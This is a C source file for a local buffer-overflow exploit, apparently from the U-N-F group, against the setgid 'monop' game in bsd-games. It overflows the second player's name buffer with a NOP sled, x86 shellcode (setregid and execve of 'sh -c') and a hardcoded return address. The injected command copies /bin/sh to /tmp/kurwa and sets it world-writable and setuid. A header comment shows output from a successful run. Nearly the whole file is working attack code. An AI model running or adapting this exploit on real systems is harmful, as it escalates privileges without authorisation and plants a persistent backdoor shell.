/* 

U-N-F http://www.u-n-f.com monosex - monop game local exploit - from bsd-games package - by ^sq
Second player's name buffer overflow.
Based on qobaiashi's u-n-f advisory. 
Shouts: UNF, wsxz, qobaiashi, sxynx, DragonK, dtorsBob, LSD, s0t4ipv6

deltha@slack9:~$ ./monosex
MONOSEX - U-N-F MONOP LOCAL BUFFER OVERFLOW
[+] Ret addy: 0x8050102
[+] Shellcode addy: 0xbffff2d0
uid=102(deltha) gid=20(games) groups=102(deltha)
ls:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB12: No such file or 
directory
459881 -rwsrwxrwx    1 deltha   games      628664 Aug 23 01:31 /tmp/kurwa

*/

#include <stdio.h> 
#include <stdlib.h> 
#define BUFPIPE 512
#define CMD "rm -f /tmp/kurwa; id; cp /bin/sh /tmp/kurwa; chmod 4777 /tmp/kurwa; ls -ila /tmp/kurwa "
#define VULN "/usr/games/monop"

int main(int argc, char **argv)

{
   FILE *pr;
   char newline[2]="\n";
   pr = popen(VULN,"w");  
   char asd[BUFPIPE];
   char firstplayer[93];
   char buf[300+4];
   char env[1024];
   int ret = 0x8050102;

   char shellcode[] = 
   /* setregid (20,20) shellcode */
   "\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47"
   "\xcd\x80"
   /*Lsd sh -c shellcode */
   "\xeb\x22"             /* jmp     <cmdshellcode+36>      */
   "\x59"                 /* popl    %ecx                   */
   "\x31\xc0"             /* xorl    %eax,%eax              */
   "\x50"                 /* pushl   %eax                   */
   "\x68""//sh"           /* pushl   $0x68732f2f            */
   "\x68""/bin"           /* pushl   $0x6e69622f            */
   "\x89\xe3"             /* movl    %esp,%ebx              */
   "\x50"                 /* pushl   %eax                   */
   "\x66\x68""-c"         /* pushw   $0x632d                */
   "\x89\xe7"             /* movl    %esp,%edi              */
   "\x50"                 /* pushl   %eax                   */
   "\x51"                 /* pushl   %ecx                   */
   "\x57"                 /* pushl   %edi                   */
   "\x53"                 /* pushl   %ebx                   */
   "\x89\xe1"             /* movl    %esp,%ecx              */
   "\x99"                 /* cdql                           */
   "\xb0\x0b"             /* movb    $0x0b,%al              */
   "\xcd\x80"             /* int     $0x80                  */
   "\xe8\xd9\xff\xff\xff" /* call    <cmdshellcode+2>       */
   ;
   printf("MONOSEX - U-N-F MONOP LOCAL BUFFER OVERFLOW\n");
   printf("[+] Ret addy: 0x%x\n", ret);
   printf("[+] Shellcode addy: 0x%x\n", shellcode);

//firstplayer increment to avoid heap addresses which contains zeros
   memset(firstplayer, 0x42, 92);
   memset(buf, 0x90, 300);
   memcpy(&buf[300], (char *)&ret, 4);
   memcpy(&buf[300 - strlen(shellcode) - strlen(CMD)],shellcode,strlen(shellcode));
   memcpy(&buf[300 - strlen(CMD)],CMD,strlen(CMD));

   if (!pr) abort();

// How many players? 2
   strcpy(asd,"2");
   strcat(asd,newline);
   fputs(asd,pr);
   fflush(pr);

// Player 1's name:
   fputs(firstplayer,pr);
   strcat(asd,newline);
   fputs(asd,pr);
   fflush(pr);

// Player 2's name: overflow
   fputs(buf,pr);
   strcat(asd,newline);
   fputs(asd,pr);
   fflush(pr);         
   pclose(pr);
   return 0;
 } 
